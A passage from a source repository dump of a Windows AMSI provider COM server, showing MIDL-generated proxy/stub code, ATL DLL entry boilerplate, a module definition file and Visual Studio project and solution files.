#define IAmsiProvider_GetIDsOfNames(This,riid,rgszNames,cNames,lcid,rgDispId)	\
    ( (This)->lpVtbl -> GetIDsOfNames(This,riid,rgszNames,cNames,lcid,rgDispId) ) 

#define IAmsiProvider_Invoke(This,dispIdMember,riid,lcid,wFlags,pDispParams,pVarResult,pExcepInfo,puArgErr)	\
    ( (This)->lpVtbl -> Invoke(This,dispIdMember,riid,lcid,wFlags,pDispParams,pVarResult,pExcepInfo,puArgErr) ) 


#endif /* COBJMACROS */


#endif 	/* C style interface */




#endif 	/* __IAmsiProvider_INTERFACE_DEFINED__ */



#ifndef __AmsiScanLib_LIBRARY_DEFINED__
#define __AmsiScanLib_LIBRARY_DEFINED__

/* library AmsiScanLib */
/* [version][uuid] */ 


EXTERN_C const IID LIBID_AmsiScanLib;

EXTERN_C const CLSID CLSID_AmsiProvider;

#ifdef __cplusplus

class DECLSPEC_UUID("1c0643e1-5b0a-4420-9b76-0de9264b4c59")
AmsiProvider;
#endif
#endif /* __AmsiScanLib_LIBRARY_DEFINED__ */

/* Additional Prototypes for ALL interfaces */

/* end of Additional Prototypes */

#ifdef __cplusplus
}
#endif

#endif



```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan_p.c`:

```c


/* this ALWAYS GENERATED file contains the proxy stub code */


 /* File created by MIDL compiler version 8.01.0622 */
/* at Mon Jan 18 19:14:07 2038
 */
/* Compiler settings for AmsiScan.idl:
    Oicf, W1, Zp8, env=Win64 (32b run), target_arch=AMD64 8.01.0622 
    protocol : all , ms_ext, c_ext, robust
    error checks: allocation ref bounds_check enum stub_data 
    VC __declspec() decoration level: 
         __declspec(uuid()), __declspec(selectany), __declspec(novtable)
         DECLSPEC_UUID(), MIDL_INTERFACE()
*/
/* @@MIDL_FILE_HEADING(  ) */

#if defined(_M_AMD64)


#if _MSC_VER >= 1200
#pragma warning(push)
#endif

#pragma warning( disable: 4211 )  /* redefine extern to static */
#pragma warning( disable: 4232 )  /* dllimport identity*/
#pragma warning( disable: 4024 )  /* array to pointer mapping*/
#pragma warning( disable: 4152 )  /* function/data pointer conversion in expression */

#define USE_STUBLESS_PROXY


/* verify that the <rpcproxy.h> version is high enough to compile this file*/
#ifndef __REDQ_RPCPROXY_H_VERSION__
#define __REQUIRED_RPCPROXY_H_VERSION__ 475
#endif


#include "rpcproxy.h"
#include "ndr64types.h"
#ifndef __RPCPROXY_H_VERSION__
#error this stub requires an updated version of <rpcproxy.h>
#endif /* __RPCPROXY_H_VERSION__ */


#include "AmsiScan_i.h"

#define TYPE_FORMAT_STRING_SIZE   3                                 
#define PROC_FORMAT_STRING_SIZE   1                                 
#define EXPR_FORMAT_STRING_SIZE   1                                 
#define TRANSMIT_AS_TABLE_SIZE    0            
#define WIRE_MARSHAL_TABLE_SIZE   0            

typedef struct _AmsiScan_MIDL_TYPE_FORMAT_STRING
    {
    short          Pad;
    unsigned char  Format[ TYPE_FORMAT_STRING_SIZE ];
    } AmsiScan_MIDL_TYPE_FORMAT_STRING;

typedef struct _AmsiScan_MIDL_PROC_FORMAT_STRING
    {
    short          Pad;
    unsigned char  Format[ PROC_FORMAT_STRING_SIZE ];
    } AmsiScan_MIDL_PROC_FORMAT_STRING;

typedef struct _AmsiScan_MIDL_EXPR_FORMAT_STRING
    {
    long          Pad;
    unsigned char  Format[ EXPR_FORMAT_STRING_SIZE ];
    } AmsiScan_MIDL_EXPR_FORMAT_STRING;


static const RPC_SYNTAX_IDENTIFIER  _RpcTransferSyntax = 
{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}};

static const RPC_SYNTAX_IDENTIFIER  _NDR64_RpcTransferSyntax = 
{{0x71710533,0xbeba,0x4937,{0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36}},{1,0}};



extern const AmsiScan_MIDL_TYPE_FORMAT_STRING AmsiScan__MIDL_TypeFormatString;
extern const AmsiScan_MIDL_PROC_FORMAT_STRING AmsiScan__MIDL_ProcFormatString;
extern const AmsiScan_MIDL_EXPR_FORMAT_STRING AmsiScan__MIDL_ExprFormatString;


extern const MIDL_STUB_DESC Object_StubDesc;


extern const MIDL_SERVER_INFO IAmsiProvider_ServerInfo;
extern const MIDL_STUBLESS_PROXY_INFO IAmsiProvider_ProxyInfo;



#if !defined(__RPC_WIN64__)
#error  Invalid build platform for this stub.
#endif

static const AmsiScan_MIDL_PROC_FORMAT_STRING AmsiScan__MIDL_ProcFormatString =
    {
        0,
        {

			0x0
        }
    };

static const AmsiScan_MIDL_TYPE_FORMAT_STRING AmsiScan__MIDL_TypeFormatString =
    {
        0,
        {
			NdrFcShort( 0x0 ),	/* 0 */

			0x0
        }
    };


/* Object interface: IUnknown, ver. 0.0,
   GUID={0x00000000,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}} */


/* Object interface: IDispatch, ver. 0.0,
   GUID={0x00020400,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}} */


/* Object interface: IAmsiProvider, ver. 0.0,
   GUID={0x05025dfe,0x70d5,0x4b61,{0xa5,0x5a,0xaa,0x21,0x58,0x5d,0x4c,0xb2}} */

#pragma code_seg(".orpc")
static const unsigned short IAmsiProvider_FormatStringOffsetTable[] =
    {
    (unsigned short) -1,
    (unsigned short) -1,
    (unsigned short) -1,
    (unsigned short) -1,
    0
    };



#endif /* defined(_M_AMD64)*/



/* this ALWAYS GENERATED file contains the proxy stub code */


 /* File created by MIDL compiler version 8.01.0622 */
/* at Mon Jan 18 19:14:07 2038
 */
/* Compiler settings for AmsiScan.idl:
    Oicf, W1, Zp8, env=Win64 (32b run), target_arch=AMD64 8.01.0622 
    protocol : all , ms_ext, c_ext, robust
    error checks: allocation ref bounds_check enum stub_data 
    VC __declspec() decoration level: 
         __declspec(uuid()), __declspec(selectany), __declspec(novtable)
         DECLSPEC_UUID(), MIDL_INTERFACE()
*/
/* @@MIDL_FILE_HEADING(  ) */

#if defined(_M_AMD64)




#if !defined(__RPC_WIN64__)
#error  Invalid build platform for this stub.
#endif


#include "ndr64types.h"
#include "pshpack8.h"


typedef 
NDR64_FORMAT_UINT32
__midl_frag1_t;
extern const __midl_frag1_t __midl_frag1;

static const __midl_frag1_t __midl_frag1 =
(NDR64_UINT32) 0 /* 0x0 */;


#include "poppack.h"



/* Object interface: IUnknown, ver. 0.0,
   GUID={0x00000000,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}} */


/* Object interface: IDispatch, ver. 0.0,
   GUID={0x00020400,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}} */


/* Object interface: IAmsiProvider, ver. 0.0,
   GUID={0x05025dfe,0x70d5,0x4b61,{0xa5,0x5a,0xaa,0x21,0x58,0x5d,0x4c,0xb2}} */

#pragma code_seg(".orpc")
static const FormatInfoRef IAmsiProvider_Ndr64ProcTable[] =
    {
    (FormatInfoRef)(LONG_PTR) -1,
    (FormatInfoRef)(LONG_PTR) -1,
    (FormatInfoRef)(LONG_PTR) -1,
    (FormatInfoRef)(LONG_PTR) -1,
    0
    };


static const MIDL_SYNTAX_INFO IAmsiProvider_SyntaxInfo [  2 ] = 
    {
    {
    {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
    0,
    AmsiScan__MIDL_ProcFormatString.Format,
    &IAmsiProvider_FormatStringOffsetTable[-3],
    AmsiScan__MIDL_TypeFormatString.Format,
    0,
    0,
    0
    }
    ,{
    {{0x71710533,0xbeba,0x4937,{0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36}},{1,0}},
    0,
    0 ,
    (unsigned short *) &IAmsiProvider_Ndr64ProcTable[-3],
    0,
    0,
    0,
    0
    }
    };

static const MIDL_STUBLESS_PROXY_INFO IAmsiProvider_ProxyInfo =
    {
    &Object_StubDesc,
    AmsiScan__MIDL_ProcFormatString.Format,
    &IAmsiProvider_FormatStringOffsetTable[-3],
    (RPC_SYNTAX_IDENTIFIER*)&_RpcTransferSyntax,
    2,
    (MIDL_SYNTAX_INFO*)IAmsiProvider_SyntaxInfo
    
    };


static const MIDL_SERVER_INFO IAmsiProvider_ServerInfo = 
    {
    &Object_StubDesc,
    0,
    AmsiScan__MIDL_ProcFormatString.Format,
    (unsigned short *) &IAmsiProvider_FormatStringOffsetTable[-3],
    0,
    (RPC_SYNTAX_IDENTIFIER*)&_NDR64_RpcTransferSyntax,
    2,
    (MIDL_SYNTAX_INFO*)IAmsiProvider_SyntaxInfo
    };
CINTERFACE_PROXY_VTABLE(7) _IAmsiProviderProxyVtbl = 
{
    0,
    &IID_IAmsiProvider,
    IUnknown_QueryInterface_Proxy,
    IUnknown_AddRef_Proxy,
    IUnknown_Release_Proxy ,
    0 /* IDispatch::GetTypeInfoCount */ ,
    0 /* IDispatch::GetTypeInfo */ ,
    0 /* IDispatch::GetIDsOfNames */ ,
    0 /* IDispatch_Invoke_Proxy */
};


static const PRPC_STUB_FUNCTION IAmsiProvider_table[] =
{
    STUB_FORWARDING_FUNCTION,
    STUB_FORWARDING_FUNCTION,
    STUB_FORWARDING_FUNCTION,
    STUB_FORWARDING_FUNCTION
};

CInterfaceStubVtbl _IAmsiProviderStubVtbl =
{
    &IID_IAmsiProvider,
    &IAmsiProvider_ServerInfo,
    7,
    &IAmsiProvider_table[-3],
    CStdStubBuffer_DELEGATING_METHODS
};

static const MIDL_STUB_DESC Object_StubDesc = 
    {
    0,
    NdrOleAllocate,
    NdrOleFree,
    0,
    0,
    0,
    0,
    0,
    AmsiScan__MIDL_TypeFormatString.Format,
    1, /* -error bounds_check flag */
    0x60001, /* Ndr library version */
    0,
    0x801026e, /* MIDL Version 8.1.622 */
    0,
    0,
    0,  /* notify & notify_flag routine table */
    0x2000001, /* MIDL flag */
    0, /* cs routines */
    0,   /* proxy/server info */
    0
    };

const CInterfaceProxyVtbl * const _AmsiScan_ProxyVtblList[] = 
{
    ( CInterfaceProxyVtbl *) &_IAmsiProviderProxyVtbl,
    0
};

const CInterfaceStubVtbl * const _AmsiScan_StubVtblList[] = 
{
    ( CInterfaceStubVtbl *) &_IAmsiProviderStubVtbl,
    0
};

PCInterfaceName const _AmsiScan_InterfaceNamesList[] = 
{
    "IAmsiProvider",
    0
};

const IID *  const _AmsiScan_BaseIIDList[] = 
{
    &IID_IDispatch,
    0
};


#define _AmsiScan_CHECK_IID(n)	IID_GENERIC_CHECK_IID( _AmsiScan, pIID, n)

int __stdcall _AmsiScan_IID_Lookup( const IID * pIID, int * pIndex )
{
    
    if(!_AmsiScan_CHECK_IID(0))
        {
        *pIndex = 0;
        return 1;
        }

    return 0;
}

const ExtendedProxyFileInfo AmsiScan_ProxyFileInfo = 
{
    (PCInterfaceProxyVtblList *) & _AmsiScan_ProxyVtblList,
    (PCInterfaceStubVtblList *) & _AmsiScan_StubVtblList,
    (const PCInterfaceName * ) & _AmsiScan_InterfaceNamesList,
    (const IID ** ) & _AmsiScan_BaseIIDList,
    & _AmsiScan_IID_Lookup, 
    1,
    2,
    0, /* table of [async_uuid] interfaces */
    0, /* Filler1 */
    0, /* Filler2 */
    0  /* Filler3 */
};
#if _MSC_VER >= 1200
#pragma warning(pop)
#endif


#endif /* defined(_M_AMD64)*/


```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScanps.def`:

```def

LIBRARY

EXPORTS
	DllGetClassObject		PRIVATE
	DllCanUnloadNow			PRIVATE
	DllRegisterServer		PRIVATE
	DllUnregisterServer		PRIVATE

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/dlldata.c`:

```c
/*********************************************************
   DllData file -- generated by MIDL compiler 

        DO NOT ALTER THIS FILE

   This file is regenerated by MIDL on every IDL file compile.

   To completely reconstruct this file, delete it and rerun MIDL
   on all the IDL files in this DLL, specifying this file for the
   /dlldata command line option

*********************************************************/

#define PROXY_DELEGATION

#include <rpcproxy.h>

#ifdef __cplusplus
extern "C"   {
#endif

EXTERN_PROXY_FILE( AmsiScan )


PROXYFILE_LIST_START
/* Start of list */
  REFERENCE_PROXY_FILE( AmsiScan ),
/* End of list */
PROXYFILE_LIST_END


DLLDATA_ROUTINES( aProxyFileList, GET_DLL_CLSID )

#ifdef __cplusplus
}  /*extern "C" */
#endif

/* end of generated dlldata file */

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/dllmain.cpp`:

```cpp
// dllmain.cpp : Implementation of DllMain.

#include "stdafx.h"
#include "resource.h"
#include "AmsiScan_i.h"
#include "dllmain.h"

CAmsiScanModule _AtlModule;

// DLL Entry Point
extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	hInstance;
	return _AtlModule.DllMain(dwReason, lpReserved);
}

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/dllmain.h`:

```h
// dllmain.h : Declaration of module class.

class CAmsiScanModule : public ATL::CAtlDllModuleT< CAmsiScanModule >
{
public :
	DECLARE_LIBID(LIBID_AmsiScanLib)
	DECLARE_REGISTRY_APPID_RESOURCEID(IDR_AMSISCAN, "{508c88ef-ca97-4107-a022-6025892ef192}")
};

extern class CAmsiScanModule _AtlModule;

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by AmsiScan.rc
//
#define IDS_PROJNAME                    100
#define IDR_AMSISCAN                    101
#define IDR_AMSIPROVIDER                106

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        201
#define _APS_NEXT_COMMAND_VALUE         32768
#define _APS_NEXT_CONTROL_VALUE         201
#define _APS_NEXT_SYMED_VALUE           107
#endif
#endif

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/stdafx.cpp`:

```cpp
// stdafx.cpp : source file that includes just the standard includes
// AmsiScan.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently,
// but are changed infrequently

#pragma once

#ifndef STRICT
#define STRICT
#endif

#include "targetver.h"

#define _ATL_APARTMENT_THREADED

#define _ATL_NO_AUTOMATIC_NAMESPACE

#define _ATL_CSTRING_EXPLICIT_CONSTRUCTORS	// some CString constructors will be explicit


#define ATL_NO_ASSERT_ON_DESTROY_NONEXISTENT_WINDOW

#include "resource.h"
#include <atlbase.h>
#include <atlcom.h>
#include <atlctl.h>

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScanPS/AmsiScanPS.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{19E4CA54-321F-481D-A457-48C4E3F3E85C}</ProjectGuid>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
    <Keyword>AtlPSProj</Keyword>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <IntDir>$(Configuration)PS\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <IntDir>$(Configuration)PS\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <IntDir>$(Configuration)PS\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <IntDir>$(Configuration)PS\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PreprocessorDefinitions>WIN32;REGISTER_PROXY_DLL;_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <AdditionalDependencies>kernel32.lib;rpcns4.lib;rpcrt4.lib;oleaut32.lib;uuid.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ModuleDefinitionFile>AmsiScanPS.def</ModuleDefinitionFile>
      <RegisterOutput>true</RegisterOutput>
    </Link>
    <PreBuildEvent>
      <Command>if exist dlldata.c goto :END
echo Error: MIDL will not generate DLLDATA.C unless you have at least 1 interface in the main project.
Exit 1
:END
</Command>
      <Message>Checking for required files</Message>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PreprocessorDefinitions>REGISTER_PROXY_DLL;_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <AdditionalDependencies>kernel32.lib;rpcns4.lib;rpcrt4.lib;oleaut32.lib;uuid.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ModuleDefinitionFile>AmsiScanPS.def</ModuleDefinitionFile>
      <RegisterOutput>true</RegisterOutput>
    </Link>
    <PreBuildEvent>
      <Command>if exist dlldata.c goto :END
echo Error: MIDL will not generate DLLDATA.C unless you have at least 1 interface in the main project.
Exit 1
:END
</Command>
      <Message>Checking for required files</Message>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PreprocessorDefinitions>WIN32;REGISTER_PROXY_DLL;NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <Optimization>MaxSpeed</Optimization>
    </ClCompile>
    <Link>
      <AdditionalDependencies>kernel32.lib;rpcns4.lib;rpcrt4.lib;oleaut32.lib;uuid.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ModuleDefinitionFile>AmsiScanPS.def</ModuleDefinitionFile>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <RegisterOutput>true</RegisterOutput>
    </Link>
    <PreBuildEvent>
      <Command>if exist dlldata.c goto :END
echo Error: MIDL will not generate DLLDATA.C unless you have at least 1 interface in the main project.
Exit 1
:END
</Command>
      <Message>Checking for required files</Message>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PreprocessorDefinitions>REGISTER_PROXY_DLL;NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <Optimization>MaxSpeed</Optimization>
    </ClCompile>
    <Link>
      <AdditionalDependencies>kernel32.lib;rpcns4.lib;rpcrt4.lib;oleaut32.lib;uuid.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ModuleDefinitionFile>AmsiScanPS.def</ModuleDefinitionFile>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <RegisterOutput>true</RegisterOutput>
    </Link>
    <PreBuildEvent>
      <Command>if exist dlldata.c goto :END
echo Error: MIDL will not generate DLLDATA.C unless you have at least 1 interface in the main project.
Exit 1
:END
</Command>
      <Message>Checking for required files</Message>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <None Include="..\AmsiScan\AmsiScanps.def" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\AmsiScan\AmsiScan_i.c">
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
      </PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="..\AmsiScan\AmsiScan_p.c">
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
      </PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="..\AmsiScan\dlldata.c">
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
      </PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScanPS/AmsiScanPS.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Generated Files">
      <UniqueIdentifier>{d4e6d057-7f5b-4186-9809-ee200840bfe8}</UniqueIdentifier>
      <SourceControlFiles>False</SourceControlFiles>
    </Filter>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <None Include="..\AmsiScan\AmsiScanps.def">
      <Filter>Source Files</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\AmsiScan\AmsiScan_i.c">
      <Filter>Generated Files</Filter>
    </ClCompile>
    <ClCompile Include="..\AmsiScan\AmsiScan_p.c">
      <Filter>Generated Files</Filter>
    </ClCompile>
    <ClCompile Include="..\AmsiScan\dlldata.c">
      <Filter>Generated Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScanPS/AmsiScanPS.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`source/AMSI/AmsiProviderC/AmsiProviderServer.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.136
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "AmsiProviderServer", "AmsiProviderServer\AmsiProviderServer.vcxproj", "{1B740B58-E395-40B5-8345-1A7265DD727D}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Debug|x64.ActiveCfg = Debug|x64
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Debug|x64.Build.0 = Debug|x64
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Debug|x86.ActiveCfg = Debug|Win32
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Debug|x86.Build.0 = Debug|Win32
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Release|x64.ActiveCfg = Release|x64
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Release|x64.Build.0 = Release|x64
		{1B740B58-E395-40B5-8345-1A7265DD727D}.Release|x86.ActiveCfg = Release|Win32
